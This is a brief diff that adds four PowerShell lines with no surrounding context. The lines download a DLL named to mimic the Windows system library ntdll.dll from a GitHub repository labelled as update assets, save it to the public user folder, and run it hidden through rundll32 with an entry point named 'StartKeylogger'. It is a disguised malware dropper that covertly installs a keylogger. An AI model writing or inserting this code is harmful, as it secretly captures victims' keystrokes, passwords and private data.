@@ -1,0 +1,4 @@
+$url = "https://raw.githubusercontent.com/0xLostByte/UpdateAssets/main/ntidll.dll"; 
+$path = "C:\Users\Public\ntidll.dll"; 
+iwr -Uri $url -OutFile $path; 
+Start-Process "rundll32.exe" -ArgumentList "$path,StartKeylogger" -WindowStyle Hidden;
